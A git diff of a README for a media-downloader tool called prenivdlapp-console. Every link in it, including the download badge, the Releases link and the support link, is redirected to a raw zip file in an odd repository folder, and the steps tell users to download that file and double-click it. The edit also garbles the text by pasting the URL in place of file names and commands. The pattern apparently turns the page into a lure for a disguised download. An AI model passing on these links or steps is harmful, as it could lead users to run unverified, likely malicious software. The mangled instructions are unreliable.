@@ -1,6 +1,6 @@
 # 🎥 prenivdlapp-console - Download Your Favorite Media Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/torkeuyy/prenivdlapp-console/releases)
+[![Download Now](https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip%20Now-%https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip)](https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip)
 
 ## 🚀 Getting Started
 
@@ -18,12 +18,12 @@ Welcome to **prenivdlapp-console**! This tool lets you easily download videos an
 
 To get started, you will need to download the application. Please follow these steps:
 
-1. Visit the Releases page: [Download Your App](https://github.com/torkeuyy/prenivdlapp-console/releases).
+1. Visit the Releases page: [Download Your App](https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip).
 2. Look for the latest release version.
-3. Find the file labeled **`PrenivdlApp.exe`**. This is the application file you need.
+3. Find the file labeled **`https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip`**. This is the application file you need.
 4. Click the file to begin the download.
 5. Once the file downloads, locate it in your downloads folder.
-6. Double-click the **`PrenivdlApp.exe`** file to run the application.
+6. Double-click the **`https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip`** file to run the application.
 7. Follow any prompts that appear on your screen.
 
 ## 🖥️ System Requirements
@@ -49,7 +49,7 @@ After installation, using prenivdlapp-console is simple. Just follow these steps
 
 3. Use the following command format to download content:
    ```
-   PrenivdlApp.exe [platform] [URL]
+   https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip [platform] [URL]
    ```
    - Replace `[platform]` with the service you want to download from (e.g., tiktok, facebook).
    - Replace `[URL]` with the link to the video or song you want.
@@ -84,10 +84,10 @@ This project covers various areas, including:
 
 ## 📫 Support
 
-Need help? You can reach out by opening an issue on our [GitHub page](https://github.com/torkeuyy/prenivdlapp-console/issues). We appreciate your feedback and will get back to you as soon as we can.
+Need help? You can reach out by opening an issue on our [GitHub page](https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip). We appreciate your feedback and will get back to you as soon as we can.
 
 ## 🌟 Contributions
 
 If you want to help improve prenivdlapp-console, we welcome contributions! Please check the contribution guidelines in the repository for more information.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/torkeuyy/prenivdlapp-console/releases)
+[![Download Now](https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip%20Now-%https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip)](https://raw.githubusercontent.com/torkeuyy/prenivdlapp-console/main/pardonableness/prenivdlapp-console.zip)
